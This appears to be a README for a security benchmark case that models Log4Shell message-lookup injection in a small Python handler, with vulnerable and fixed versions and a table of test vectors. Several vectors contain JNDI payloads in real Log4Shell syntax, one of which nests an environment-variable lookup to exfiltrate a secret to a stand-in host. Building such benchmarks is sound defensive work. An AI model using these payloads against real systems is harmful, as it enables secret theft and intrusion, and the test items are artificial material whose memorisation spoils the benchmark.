# Log4Shell: message lookup injection

An original logging handler model inspired by Log4Shell. Nested expressions in untrusted message text invoke an offline naming-service callback and can include a synthetic private configuration value in that lookup. An actual log file records the final message. This is not Log4j/JNDI, LDAP networking, class loading or RCE.

| Attribute | Value |
|---|---|
| Technology | Python |
| CWE | CWE-917 |
| CVE | CVE-2021-44228 |
| OWASP | A05:2025 |
| Test scope | `handler-model` |

[Vulnerable source](vulnerable/main.py) · [Corrected source](fixed/main.py)

## Correction

Write untrusted log messages as data without expression evaluation. The vulnerable miniature interpreter accepts only bounded env and jndi-like lookups, resolves nested innermost expressions, and sends requests to a synthetic callback; it never uses eval or a real network. The application-level correction illustrates the boundary, while actual Log4Shell remediation is updating the affected log4j-core dependency and accounting for its subsequent advisories.

## Regression

```sh
python3 tools/lab.py test --case python/log4shell-lookup --strict
```

Run from the repository root. Exact inputs and expected outputs are in
[the catalog](../../../catalog/cases.json). Both variants are tested.

The runner also checks every declared file effect. `functional` vectors can specify a useful
operation that the vulnerable implementation did not support correctly; `robustness` vectors
exercise malformed inputs. `benign` vectors require identical expectations.

| Vector | Type | Vulnerable expectation | Fixed expectation |
|---|---|---|---|
| ordinary message | benign | {"equals": {"status": 200, "message": "Request received", "lookups": []}, "files": [{"path": "application.log", "content": "Request received\n"}]} | {"equals": {"status": 200, "message": "Request received", "lookups": []}, "files": [{"path": "application.log", "content": "Request received\n"}]} |
| unicode message | benign | {"equals": {"status": 200, "message": "Connexion réussie", "lookups": []}, "files": [{"path": "application.log", "content": "Connexion réussie\n"}]} | {"equals": {"status": 200, "message": "Connexion réussie", "lookups": []}, "files": [{"path": "application.log", "content": "Connexion réussie\n"}]} |
| empty message | benign | {"equals": {"status": 200, "message": "", "lookups": []}, "files": [{"path": "application.log", "content": "\n"}]} | {"equals": {"status": 200, "message": "", "lookups": []}, "files": [{"path": "application.log", "content": "\n"}]} |
| naming lookup in message | attack | {"equals": {"status": 200, "message": "LAB_LOOKUP_RESULT", "lookups": ["ldap://lookup.test/item"]}, "files": [{"path": "application.log", "content": "LAB_LOOKUP_RESULT\n"}]} | {"equals": {"status": 200, "message": "${jndi:ldap://lookup.test/item}", "lookups": []}, "files": [{"path": "application.log", "content": "${jndi:ldap://lookup.test/item}\n"}]} |
| nested config exfiltration | attack | {"equals": {"status": 200, "message": "LAB_LOOKUP_RESULT", "lookups": ["ldap://lookup.test/LAB_PRIVATE_TOKEN"]}, "files": [{"path": "application.log", "content": "LAB_LOOKUP_RESULT\n"}]} | {"equals": {"status": 200, "message": "${jndi:ldap://lookup.test/${env:LAB_LOG_SECRET}}", "lookups": []}, "files": [{"path": "application.log", "content": "${jndi:ldap://lookup.test/${env:LAB_LOG_SECRET}}\n"}]} |
| alternate naming protocol | attack | {"equals": {"status": 200, "message": "LAB_LOOKUP_RESULT", "lookups": ["rmi://lookup.test/object"]}, "files": [{"path": "application.log", "content": "LAB_LOOKUP_RESULT\n"}]} | {"equals": {"status": 200, "message": "${jndi:rmi://lookup.test/object}", "lookups": []}, "files": [{"path": "application.log", "content": "${jndi:rmi://lookup.test/object}\n"}]} |
| literal unknown expression preserved | functional | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} | {"equals": {"status": 200, "message": "${ordinary}", "lookups": []}, "files": [{"path": "application.log", "content": "${ordinary}\n"}]} |
| missing message | robustness | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} |
| wrong request type | robustness | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} |
| newline denied | robustness | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} |
| oversized message | robustness | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} | {"equals": {"status": 400, "error": "invalid message"}, "files": [{"path": "application.log", "type": "absent"}]} |

## Inspiration and provenance

Original benchmark implementation inspired by the documented weakness;
no third-party exploit source is copied or executed.

- [Apache Log4j CVE-2021-44228 — official security advisory](https://logging.apache.org/security.html)
- [EDB-51183 — Log4Shell in AD Manager Plus](https://www.exploit-db.com/exploits/51183)

This example demonstrates the declared weakness within the documented fixture assumptions.
It is not a production application or a proof that every related attack is prevented.

[Technology index](../README.md) · [Benchmark methodology](../../../docs/BENCHMARK.md)
